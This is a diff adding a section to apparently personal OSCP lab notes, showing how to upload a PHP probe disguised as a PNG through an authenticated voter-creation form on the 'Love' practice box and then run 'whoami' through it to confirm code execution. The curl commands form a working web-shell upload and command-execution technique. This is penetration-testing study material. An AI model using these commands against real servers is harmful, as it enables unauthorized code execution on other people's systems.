@@ -120,6 +120,35 @@ Seen in [[OSCP/BOXES/WRITE UPS/Windows/Buff|Buff]].
 
 #### Tags: #GymManagement #DoubleExtension #FilenameParsing #PHPWebshell #CommandBreakdowns
 
+## Love Voting System upload: why redirect is not proof
+
+The authenticated voter creation form accepts the upload in the `photo` field. The client-side name and declared MIME type are separate from the server-side execution decision, so preserve the exact field name and declare the test file as `image/png`:
+
+```bash
+curl -sS -i -b "$CookieFile" \
+  -F "photo=@$BoxDir/exploits/probe.php;type=image/png" \
+  --form-string 'firstname=a' \
+  --form-string 'lastname=b' \
+  --form-string 'password=1' \
+  --form-string 'add=' \
+  "http://$BoxIP/Admin/voters_add.php"
+
+curl -sS -G --data-urlencode 'cmd=whoami' \
+  "http://$BoxIP/images/probe.php"
+```
+
+| Part | Purpose |
+|---|---|
+| `-b "$CookieFile"` | Reuses the authenticated administrator session. |
+| `-F photo=...;type=image/png` | Sends the PHP source in the expected multipart field while declaring an image MIME type. |
+| Required voter fields | Keeps the request on the normal voter-creation path. |
+| `/Admin/voters_add.php` | The working upload handler identified from the reviewed exploit and manual testing. |
+| Follow-up `whoami` request | Proves the file landed and executed; a `302` alone does not. |
+
+Troubleshoot in this order: confirm the session cookie, confirm the endpoint and field name, confirm the local filename, inspect the `Location` header, then request the expected file path. A `404` on `/images/probe.php` means the upload or path assumption is wrong, not that the redirect proved code execution. See [[OSCP/BOXES/WRITE UPS/Windows/Love|Love]].
+
+#### Tags: #VotingSystem #AuthenticatedUpload #MIMEType #ExecutionProof #CommandBreakdowns
+
 ## External Resources
 
 - [HackTricks - Pentesting Index](https://hacktricks.wiki/en/index.html)
@@ -138,3 +167,4 @@ This page turns one repeatable part of an authorized assessment into a checklist
 ## Demonstrated in box write-ups
 
 - [[OSCP/BOXES/WRITE UPS/AD/Forest|Forest]] -- demonstrates the workflow described here
+- [[OSCP/BOXES/WRITE UPS/Windows/Love|Love]] -- redirect-versus-execution proof in an authenticated PHP upload
